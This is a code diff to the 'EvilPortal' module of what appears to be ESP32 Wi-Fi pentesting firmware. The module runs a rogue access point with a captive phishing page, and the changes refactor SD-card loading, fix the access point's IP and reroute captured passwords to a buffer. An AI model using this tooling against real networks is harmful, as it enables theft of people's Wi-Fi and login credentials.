@@ -92,41 +92,41 @@ bool EvilPortal::setHtml() {
     return true;
   }
   Serial.println("Setting HTML...");
-  #ifndef WRITE_PACKETS_SERIAL
+  #ifdef HAS_SD
     File html_file = sd_obj.getFile("/" + this->target_html_name);
-    if (!html_file) {
+  #else
+    File html_file;
+  #endif
+  if (!html_file) {
+    #ifdef HAS_SCREEN
+      this->sendToDisplay("Could not find /" + this->target_html_name);
+      this->sendToDisplay("Touch to exit...");
+    #endif
+    Serial.println("Could not find /" + this->target_html_name + ". Use stopscan...");
+    return false;
+  }
+  else {
+    if (html_file.size() > MAX_HTML_SIZE) {
       #ifdef HAS_SCREEN
-        this->sendToDisplay("Could not find /" + this->target_html_name);
+        this->sendToDisplay("The given HTML is too large.");
+        this->sendToDisplay("The Byte limit is " + (String)MAX_HTML_SIZE);
         this->sendToDisplay("Touch to exit...");
       #endif
-      Serial.println("Could not find /" + this->target_html_name + ". Use stopscan...");
+      Serial.println("The provided HTML is too large. Byte limit is " + (String)MAX_HTML_SIZE + "\nUse stopscan...");
       return false;
     }
-    else {
-      if (html_file.size() > MAX_HTML_SIZE) {
-        #ifdef HAS_SCREEN
-          this->sendToDisplay("The given HTML is too large.");
-          this->sendToDisplay("The Byte limit is " + (String)MAX_HTML_SIZE);
-          this->sendToDisplay("Touch to exit...");
-        #endif
-        Serial.println("The provided HTML is too large. Byte limit is " + (String)MAX_HTML_SIZE + "\nUse stopscan...");
-        return false;
-      }
-      String html = "";
-      while (html_file.available()) {
-        char c = html_file.read();
-        if (isPrintable(c))
-          html.concat(c);
-      }
-      strncpy(index_html, html.c_str(), strlen(html.c_str()));
-      this->has_html = true;
-      Serial.println("html set");
-      html_file.close();
-      return true;
+    String html = "";
+    while (html_file.available()) {
+      char c = html_file.read();
+      if (isPrintable(c))
+        html.concat(c);
     }
-  #else
-    return false;
-  #endif
+    strncpy(index_html, html.c_str(), strlen(html.c_str()));
+    this->has_html = true;
+    Serial.println("html set");
+    html_file.close();
+    return true;
+  }
 
 }
 
@@ -143,47 +143,47 @@ bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_
   // If there are no SSIDs and there are no APs selected, pull from file
   // This means the file is last resort
   if ((ssids->size() <= 0) && (temp_ap_name == "")) {
-    #ifndef WRITE_PACKETS_SERIAL
+    #ifdef HAS_SD
       File ap_config_file = sd_obj.getFile("/ap.config.txt");
-      // Could not open config file. return false
-      if (!ap_config_file) {
+    #else
+      File ap_config_file;
+    #endif
+    // Could not open config file. return false
+    if (!ap_config_file) {
+      #ifdef HAS_SCREEN
+        this->sendToDisplay("Could not find /ap.config.txt.");
+        this->sendToDisplay("Touch to exit...");
+      #endif
+      Serial.println("Could not find /ap.config.txt. Use stopscan...");
+      return false;
+    }
+    // Config file good. Proceed
+    else {
+      // ap name too long. return false        
+      if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
         #ifdef HAS_SCREEN
-          this->sendToDisplay("Could not find /ap.config.txt.");
+          this->sendToDisplay("The given AP name is too large.");
+          this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
           this->sendToDisplay("Touch to exit...");
         #endif
-        Serial.println("Could not find /ap.config.txt. Use stopscan...");
+        Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
         return false;
       }
-      // Config file good. Proceed
-      else {
-        // ap name too long. return false        
-        if (ap_config_file.size() > MAX_AP_NAME_SIZE) {
-          #ifdef HAS_SCREEN
-            this->sendToDisplay("The given AP name is too large.");
-            this->sendToDisplay("The Byte limit is " + (String)MAX_AP_NAME_SIZE);
-            this->sendToDisplay("Touch to exit...");
-          #endif
-          Serial.println("The provided AP name is too large. Byte limit is " + (String)MAX_AP_NAME_SIZE + "\nUse stopscan...");
-          return false;
+      // AP name length good. Read from file into var
+      while (ap_config_file.available()) {
+        char c = ap_config_file.read();
+        Serial.print(c);
+        if (isPrintable(c)) {
+          ap_config.concat(c);
         }
-        // AP name length good. Read from file into var
-        while (ap_config_file.available()) {
-          char c = ap_config_file.read();
-          Serial.print(c);
-          if (isPrintable(c)) {
-            ap_config.concat(c);
-          }
-        }
-        #ifdef HAS_SCREEN
-          this->sendToDisplay("AP name from config file");
-          this->sendToDisplay("AP name: " + ap_config);
-        #endif
-        Serial.println("AP name from config file: " + ap_config);
-        ap_config_file.close();
       }
-    #else
-      return false;
-    #endif
+      #ifdef HAS_SCREEN
+        this->sendToDisplay("AP name from config file");
+        this->sendToDisplay("AP name: " + ap_config);
+      #endif
+      Serial.println("AP name from config file: " + ap_config);
+      ap_config_file.close();
+    }
   }
   // There are SSIDs in the list but there could also be an AP selected
   // Priority is SSID list before AP selected and config file
@@ -242,10 +242,13 @@ bool EvilPortal::setAP(LinkedList<ssid>* ssids, LinkedList<AccessPoint>* access_
 }
 
 void EvilPortal::startAP() {
+  const IPAddress AP_IP(172, 0, 0, 1);
+
   Serial.print("starting ap ");
   Serial.println(apName);
 
   WiFi.mode(WIFI_AP);
+  WiFi.softAPConfig(AP_IP, AP_IP, IPAddress(255, 255, 255, 0));
   WiFi.softAP(apName);
 
   #ifdef HAS_SCREEN
@@ -270,37 +273,6 @@ void EvilPortal::startPortal() {
   this->startAP();
 
   this->runServer = true;
-}
-
-void EvilPortal::convertStringToUint8Array(const String& str, uint8_t*& buf, uint32_t& len) {
-  len = str.length(); // Obtain the length of the string
-
-  buf = new uint8_t[len]; // Dynamically allocate the buffer
-
-  // Copy each character from the string to the buffer
-  for (uint32_t i = 0; i < len; i++) {
-    buf[i] = static_cast<uint8_t>(str.charAt(i));
-  }
-}
-
-void EvilPortal::addLog(String log, int len) {
-  bool save_packet = settings_obj.loadSetting<bool>(text_table4[7]);
-  if (save_packet) {
-    uint8_t* logBuffer = nullptr;
-    uint32_t logLength = 0;
-    this->convertStringToUint8Array(log, logBuffer, logLength);
-    
-    #ifdef WRITE_PACKETS_SERIAL
-      buffer_obj.addPacket(logBuffer, logLength, true);
-      delete[] logBuffer;
-    #elif defined(HAS_SD)
-      sd_obj.addPacket(logBuffer, logLength, true);
-      delete[] logBuffer;
-    #else
-      delete[] logBuffer;
-      return;
-    #endif
-  }
 }
 
 void EvilPortal::sendToDisplay(String msg) {
@@ -329,7 +301,7 @@ void EvilPortal::main(uint8_t scan_mode) {
       String logValue2 = "p: " + this->password;
       String full_string = logValue1 + " " + logValue2 + "\n";
       Serial.print(full_string);
-      this->addLog(full_string, full_string.length());
+      buffer_obj.append(full_string);
       #ifdef HAS_SCREEN
         this->sendToDisplay(full_string);
       #endif
